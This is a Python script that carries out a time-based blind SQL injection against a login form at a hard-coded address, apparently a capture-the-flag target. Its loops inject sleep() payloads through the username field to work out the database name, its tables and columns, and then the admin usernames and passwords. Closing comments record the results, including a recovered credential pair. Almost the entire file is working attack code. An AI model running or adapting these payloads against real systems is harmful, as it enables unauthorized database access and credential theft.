import secrets
import  requests
import string
import time 

# BLIND SQLI 

URL = 'http://35.227.24.107/e3bdb455e9/login'

data = {
    "username":"blabla",
    "password": "1234"
}

LEN_DB = 0
NAME_DB = ''
NAME_TABLES = ''
NAME_COLUMNS = ''

# brute length database 

for i in range(100):
    payload = f"'or if(((select length((select database())))={i}),sleep(3),0)-- -"
    data["username"] = payload
    start = time.time()
    r = requests.post(URL, data=data).text
    end = time.time()
    if end-start >= 2.5:
        print("FOUND {}".format(i))
        LEN_DB = i
        break
    else:
        print("FAILED {}".format(i))

            
print("="*50)        

# brute name db 

for k in range(LEN_DB):
    for i in string.printable:
        payload = f"'or if((select substr((select database()),{k+1},1))='{i}',sleep(3),0)-- -"
        data["username"] = payload
        start = time.time()
        r = requests.post(URL, data=data).text
        end = time.time()
        if end-start >= 2.5:
            print("FOUND {}".format(i))
            NAME_DB += i
            break
        else:
            print("FAILED {}".format(i))

print("="*50)

    
# brute tables 

for k in range(1000):
    for i in range(33, 128):
        payload = f"'or if((select ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='{NAME_DB}'),{k+1},1))={i}),sleep(3),0)-- -"
        data["username"] = payload
        start = time.time()
        r = requests.post(URL, data=data).text
        end = time.time()
        if end-start >= 2.5:
            print("FOUND {}".format(chr(i)))
            NAME_TABLES += chr(i)
            break
        else:
            print("FAILED {}".format(chr(i)))
            
print("="*50)


# brute columns 

for k in range(0,60):
    for i in range(33, 127):
        payload = f"'or if((select ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='pages'),{k+1},1))={i}),sleep(3),0)-- -"
        data["username"] = payload
        start = time.time()
        r = requests.post(URL, data=data).text
        end = time.time()
        if end-start >= 2.5:
            print("FOUND {}".format(chr(i)))
            NAME_COLUMNS += chr(i)
            break
        else:
            print("FAILED {}".format(chr(i)))

# GET DATA FROM TABLES 

accounts = ''
for k in range(34,200):
    for i in range(48,127):
        if i >= 65 and i <= 90:
            continue
        payload = f"'or if((select ascii(substr((select group_concat(username,':',password) from admins),{k+1},1)))={i},sleep(3),0)-- -"
        data["username"] = payload
        start = time.time()
        r = requests.post(URL, data=data).text
        end = time.time()
        if end-start >= 2.5:
            print("FOUND {}".format(i))
            accounts += chr(i)
            print(accounts)
            break
        else:
            print("FAILED {}".format(chr(i)))
    
            
# print("[+] Length of database: " + LEN_DB)
# print("[+] Name of database: " + NAME_DB)
# print("[+] Name of tables: " + NAME_TABLES)
# print("[+] Columns in table: " + NAME_COLUMNS)
# print("[+] Accounts: " + accounts)


# len_db = 6
# tables = pages, admins 
# columns of admins table: id, username, password 
# columns of pages table: id,public,title,body
# data from admins
# shelley:clair

